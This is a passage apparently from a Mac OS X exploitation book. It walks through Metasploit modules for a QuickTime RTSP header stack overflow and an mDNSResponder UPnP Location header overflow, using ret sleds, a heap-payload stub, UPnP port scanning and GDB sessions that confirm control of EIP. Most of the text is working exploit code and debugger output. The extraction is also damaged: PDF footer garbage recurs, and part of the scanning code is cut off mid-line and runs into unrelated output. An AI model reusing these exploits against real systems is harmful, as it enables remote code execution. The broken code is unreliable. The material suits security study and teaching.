gs 0x37 55
(gdb) x/8x $esp
0xbfffd450: 0x346b4133 0x41356b41 0x8fe66448 0x8fe66448
0xbfffd460: 0x41396b41 0x6c41306c 0x326c4131 0x41336c41
We will have to work around Leopard’s non-executable stack and Library
Randomization. We are going to do this using the exec-payload-from-heap stub
that we described in Chapter 7; however, there are some complications in this
case that we will need to work around. The stub assumes that it is written begin-
ning at the overwritten frame pointer (EBP) and that the payload follows imme-
diately after it. In this case the writable and readable memory addresses that we
have just placed in the attack string are at offsets that would fall in the middle of
the stub. To work around this we will move the stub to after these elements in
the attack string and adjust execution as necessary so that the stub will function
normally. This will be a little tricky, but no one said exploits were trivial.
Look at the dump of the stack pointer in the GDB output in the preceding
code. At the time that our fi rst return address is used, it points to eight bytes
before our writable memory addresses. We want to adjust the stack pointer so
that it points to after them, where we can place our exec-payload-from-heap
stub. We will do this fi rst by returning to a ret instruction (ret2ret). This will
adjust our stack pointer forward by four bytes. We can do this multiple times
in a ret sled to advance our stack pointer forward arbitrarily. Nevertheless, we
will soon run into our writable memory addresses in our attack string. We will
skip over those by terminating the ret sled with a return address that executes
two pop instructions and then a ret instruction, but wait—there is more. We
must place the fi rst four bytes of the stub in the attack string at the offset of the
overwritten saved frame pointer and then place the rest of it after the writable
memory addresses.
This fi nally makes our exploit method look like the following. We use a few
breakpoint interrupts instead of a payload so that we can verify that we are
executing instructions from the attack string correctly.
def on_client_connect(client)
boom = Rex::Text.pattern_create(5000)
boom[307, 4] = [target[‘ret’]].pack(‘V’)
boom[311, 4] = [target[‘ret’]].pack(‘V’)
boom[315, 4] = [target[‘poppopret’]].pack(‘V’)
9955336633cc1100..iinndddd 227755 11//2255//0099 44::4422::4477 PPMM
276 Part III ■ Exploitation
boom[319, 4] = [target[‘Writable’]].pack(‘V’)
boom[323, 4] = [target[‘Writable’]].pack(‘V’)
#
# Create exec-payload-from-heap-stub, but split it in two.
# The first word must be placed as the overwritten saved ebp
# in the attack string. The rest is placed after the
# Writable memory addresses.
#
magic = make_exec_payload_from_heap_stub()
boom[303, 4] = magic[0, 4]
boom[327, magic.length - 4] = magic[4..-1]
#
# Place the payload immediately after the stub as it expects
#
boom[327 + magic.length - 4, 4] = “\xCC\xCC\xCC\xCC”
body = “ “
header =
“RTSP/1.0 200 OK\r\n”+
“CSeq: 1\r\n”+
“Content-Type: #{boom}\r\n”+
“Content-Length: #{body.length}\r\n\r\n”
client.put(header + body)
handler(client)
end
When we launch the exploit against a QuickTime Player in the debugger, we
successfully execute the breakpoint interrupts.
Program received signal SIGTRAP, Trace/breakpoint trap.
0x0e3af001 in ?? ()
(gdb)
Now, as before, we can just replace the breakpoint instructions with the
Metasploit payload, and we have a fully functioning Metasploit exploit.
mDNSResponder UPnP Location Header Overfl ow
As we discussed earlier in this book, mDNSResponder is the daemon responsible
for Bonjour (formerly known as Rendezvous). It is enabled by default and allowed
through the fi rewall on all versions of Mac OS X. That makes it very security
sensitive. On Leopard mDNSResponder runs as an unprivileged user and is
sandboxed. On Tiger there is no sandbox and mDNSResponder runs as root.
9955336633cc1100..iinndddd 227766 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 277
mDNSResponder has some other functionality that is not so well advertised.
It is also responsible for creating NAT mappings in home routers using the
Universal Plug and Play (UPnP) protocol. The code dealing with this protocol
has had a number of vulnerabilities in the past. In particular, on Mac OS X 10.4.0
through 10.4.9 there was a data segment buffer overfl ow in the processing of
Location headers in UPnP responses. This vulnerability was a default confi gura-
tion remote root that couldn’t be stopped using the built-in Mac OS X fi rewall,
making it perhaps one of the most serious vulnerabilities discovered in OS X.
Triggering the Vulnerability
Data segment buffer overfl ows are unlike stack and heap overfl ows because
there are no inline control data structures to overwrite. Sometimes, however,
there are data variables that can be overwritten to gain control of execution. In
this case, a very long (roughly 22 KB) string used for the overfl ow will overwrite
a global structure that contains a pair of callback function pointers. By overwrit-
ing these pointers and manipulating mDNSResponder into calling them, we
can gain execution control and execute arbitrary code.
mDNSResponder listens on an ephemeral UDP port for UPnP responses.
The ports in the range 49152 to 65535 are reserved for ephemeral ports and
mDNSResponder’s UPnP port will often be found on one of the lower ports in
this range.
When mDNSResponder receives a UPnP response, it does not care if it did
not send out any requests. It will also attempt to download a fi le from the URL
given in the Location header of the UPnP response. We use this fact to scan for
the port that the UPnP service is listening on. By sending a UPnP response to
each UDP port in the ephemeral port range with a unique URL, we can identify
which port the UPnP service is listening on by correlating the URL requested
to the port that we sent it to. Once we have identifi ed the UPnP service’s UDP
port, we can send the UPnP response with the long Location header to trigger
the vulnerability.
In our Metasploit module, we perform this scan with two methods: scan_for_
upnp_port(), which does the active scanning, and upnp_server(), which is run
within a thread to receive and process incoming UPnP GET requests.
def upnp_server(server)
client = server.accept()
request = client.readline()
if (request =~ /GET \/([\da-f]+).xml/)
@mutex.synchronize {
@found_upnp_port = true
@upnp_port = @key_to_port[$1]
# Important: Keep the client connection open
@client_socket = client
}
9955336633cc1100..iinndddd 227777 11//2255//0099 44::4422::4477 PPMM
278 Part III ■ Exploitation
end
end
def scan_for_upnp_port
@upnp_port = 0
@found_upnp_port = false
upnp_port = 0
server = TCPServer.open(1900)
server_thread = Thread.new { self.upnp_server(server) }
begin
socket = Rex::Socket.create_udp
upnp_location =
“http://” + datastore[‘LHOST’] + “:” + datastore[‘SRVPORT’]
puts “[*] Listening for UPNP requests on: #{upnp_location}”
puts “[*] Sending UPNP Discovery replies…”
i = 49152;
while i p->NetworkChanged && now - m->p->NetworkChanged
>= 0) mDNSMacOSXNetworkChanged(m);
(gdb) p /x *m
$1 = {
p = 0x41306541,
KnownBugs = 0x65413165,
CanReceiveUnicastOn5353 = 0x33654132,
AdvertiseLocalAddresses = 0x41346541,
mDNSPlatformStatus = 0x65413565,
UnicastPort4 = {
b = {0x36, 0x41},
NotAnInteger = 0x4136
},
UnicastPort6 = {
b = {0x65, 0x37},
NotAnInteger = 0x3765
},
MainCallback = 0x41386541,
…
Our pattern string has overwritten the contents of this mDNS structure m.
More importantly, this structure contains a function pointer in its MainCallback
element, and it is called by the mDNSMacOSXNetworkChanged() function. For
this function to be called, m->p->NetworkChanged must be nonzero and less
than the value for the variable. This variable is set to the return value of time(),
which returns the current time in seconds past the UNIX epoch (January 1,
1970 at 00:00:00 UTC).
The structure member NetworkChanged is stored at offset 168 from p. We will
address this by placing the writable memory address of a nonzero value minus
168 at its offset in the attack string; however, it is more complicated than this.
Other functions called from mDNSMacOSXNetworkChanged() will crash if the
9955336633cc1100..iinndddd 228800 11//2255//0099 44::4422::4477 PPMM
Chapter 10 ■ Real-World Exploits 281
p structure is not a valid linked list. This is diffi cult to replicate in an exploit,
so we make sure that it is an empty linked list by pointing it to zero. Therefore,
our value for m has to satisfy the following:
■ It is a memory address that points to zero.
■ The value at offset 168 from that memory address is nonzero.
■ T he value is less than the return value of time(), so it should be as low
a number as possible.
With some manual searching, we easily fi nd a suitable address within dyld’s
data segment (0x8fe510a0). As before, we will fi nd the offset at which to place
it by giving the observed pattern string value to Metasploit’s pattern_offset.rb.
Now we can patch it into the attack string in our Metasploit module and run
the exploit once more. When we do so, we see that we control EIP and have
jumped to a memory location taken from our pattern string.
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0x41386541
0x41386541 in ?? ()
(gdb) info reg
eax 0x59040 364608
ecx 0x1800038 25165880
edx 0x41386541 1094214977
ebx 0xbfffff0c -1073742068
esp 0xbffff33c 0xbffff33c
ebp 0xbffff368 0xbffff368
esi 0xbfffff5a -1073741990
edi 0x4fd22 326946
eip 0x41386541 0x41386541
eflags 0x10206 66054
cs 0x17 23
ss 0x1f 31
ds 0x1f 31
es 0x1f 31
fs 0x0 0
gs 0x37 55
(gdb) x/4x $eax
0x59040: 0x8fe510a0 0x65413165 0x33654132 0x41346541
In our examination of the registers in this code, we can see that the EAX reg-
ister points to the magic address within the attack string. This is not very useful
to us since it is very hard to fi nd useful return addresses that add or subtract
from EAX before jumping to it. Therefore, we will take another approach.
Variables in the data segment are at known static locations. Because they
do not depend on runtime behavior as stack and heap memory do, we can be
confi dent that a hard-coded address for a data segment variable will be constant
across all identical builds of that software. In this case we will hard-code the
9955336633cc1100..iinndddd 228811 11//2255//0099 44::4422::4477 PPMM
282 Part III ■ Exploitation
address of the beginning of our attack string. We can fi nd the address of the
beginning of our attack string by subtracting the offset of a known element of
it from a pointer to it.
(gdb) x/4x $eax
0x59040: 0x8fe510a0 0x65413165 0x33654132 0x41346541
We fi nd that the value 0x65413165 is at offset 124 within our pattern string and
is stored at memory address 0x59044. By subtracting that offset and 21,000 bytes
for the spacer that we use before the pattern string, we will fi nd the address at
which our attack string begins.
(gdb) p /x 0x59044 - 124 - 21000
$2 = 0x53dc0
(gdb) x/x 0x53dc0
0x53dc0 : 0x41414141
(gdb) x/x 0x53dc0 - 4